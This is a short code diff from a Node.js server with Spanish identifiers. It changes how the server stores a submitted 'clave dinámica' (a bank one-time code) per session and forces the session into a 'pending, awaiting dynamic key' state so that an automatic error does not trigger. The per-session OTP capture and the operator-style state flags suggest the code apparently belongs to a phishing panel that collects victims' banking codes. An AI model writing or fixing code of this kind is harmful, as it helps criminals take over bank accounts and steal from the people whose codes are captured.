@@ -733,7 +733,11 @@ const server = http.createServer(async (req, res) => {
                 const codigo = claveDinamica || otp;
                 const previos = bcSesiones.get(sessionId) || {};
                 bcSesiones.set(sessionId, { ...previos, claveDinamica: codigo });
-                if (!estadoSesiones.has(sessionId)) { estadoSesiones.set(sessionId, 'pendiente'); ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP'); }
+                
+                // 🔥 CORRECCIÓN: Forzar estado a "pendiente" para que no salte el error automático
+                estadoSesiones.set(sessionId, 'pendiente'); 
+                ultimaAccionSesiones.set(sessionId, 'ESPERANDO_DINAMICA'); 
+                
                 const datosSesion = datosSesiones.get(sessionId) || {};
                 const datosActualizados = { ...datosSesion, claveDinamica: codigo, otp: codigo };
                 datosSesiones.set(sessionId, datosActualizados);
